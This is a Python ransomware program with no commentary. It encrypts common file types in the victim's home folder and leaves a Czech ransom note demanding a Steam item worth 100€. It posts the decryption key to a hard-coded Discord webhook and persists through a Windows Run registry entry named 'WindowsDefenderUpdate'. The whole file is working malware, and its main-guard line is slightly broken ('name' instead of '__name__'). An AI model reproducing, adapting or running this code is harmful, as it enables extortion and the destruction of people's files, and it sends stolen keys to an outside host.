import os
import uuid
import time
import base64
import pathlib
import requests
import subprocess
import winreg
from cryptography.fernet import Fernet

# === CONFIGURATION ===

WEBHOOK_URL = "https://discord.com/api/webhooks/1396813335776989184/0kPctN_oSkU2rebRm7Zd_HRqkFOrVp3ZjaYe_zO89BaD4mW4TjYW3wSszlOybx0fRMJW"
EXCLUDE_DIRS = [
    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Steam"
]
TARGET_EXTENSIONS = ['.exe', '.txt', '.jpg', '.jpeg', '.doc', '.pdf']
RANSOM_NOTE_NAME = "ransomnote.txt"

# === RANSOM PAYLOAD INITIALIZATION ===

device_id = str(uuid.uuid4())
key = Fernet.generate_key()
fernet = Fernet(key)

# === UTILITY FUNCTIONS ===

def is_safe_path(path):
    path = os.path.abspath(path)
    return not any(path.startswith(ex) for ex in EXCLUDE_DIRS)

def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(filepath, 'wb') as f:
            f.write(encrypted)
    except Exception:
        pass

def decrypt_file(filepath, fernet_obj):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        decrypted = fernet_obj.decrypt(data)
        with open(filepath, 'wb') as f:
            f.write(decrypted)
    except Exception:
        pass

def encrypt_directory(start_path):
    for root, _, files in os.walk(start_path):
        if not is_safe_path(root):
            continue
        for file in files:
            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                encrypt_file(os.path.join(root, file))

def decrypt_directory(start_path, fernet_obj):
    for root, _, files in os.walk(start_path):
        if not is_safe_path(root):
            continue
        for file in files:
            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                decrypt_file(os.path.join(root, file), fernet_obj)

def drop_ransom_note(path):
    ransom_msg = f"""
Vaše soubory byly zašifrovány.

🆔 ID: {device_id}

1. Pošlete skin v hodnotě 100€ na Steam účet.
2. Poté obdržíte dešifrovací klíč přes Discord.
3. Klíč vložte do souboru 'key.txt' na ploše.

Soubor bude automaticky ověřen a dojde k dešifrování.
"""
    with open(os.path.join(path, RANSOM_NOTE_NAME), 'w', encoding='utf-8') as f:
        f.write(ransom_msg)

def send_key_to_discord(device_id, key):
    data = {
        "content": f"💀 NEW DEVICE INFECTED 💀\n🆔 ID: `{device_id}`\n🔑 Key: `{key.decode()}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception:
        pass

def add_to_startup(file_path=None, name="WindowsDefenderUpdate"):
    if not file_path:
        file_path = os.path.abspath(__file__)
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def watch_for_key_file(expected_key_bytes):
    desktop = os.path.join(str(pathlib.Path.home()), "Desktop")
    key_file = os.path.join(desktop, "key.txt")
    while True:
        if os.path.exists(key_file):
            try:
                with open(key_file, 'r') as f:
                    entered_key = f.read().strip().encode()
                if entered_key == expected_key_bytes:
                    fernet_obj = Fernet(entered_key)
                    decrypt_directory(str(pathlib.Path.home()), fernet_obj)
                    break
            except Exception:
                pass
        time.sleep(10)

# === MAIN EXECUTION ===

def main():
    user_home = str(pathlib.Path.home())
    encrypt_directory(user_home)
    drop_ransom_note(user_home)
    send_key_to_discord(device_id, key)
    add_to_startup()
    watch_for_key_file(key)

if name == "__main__":
    main()
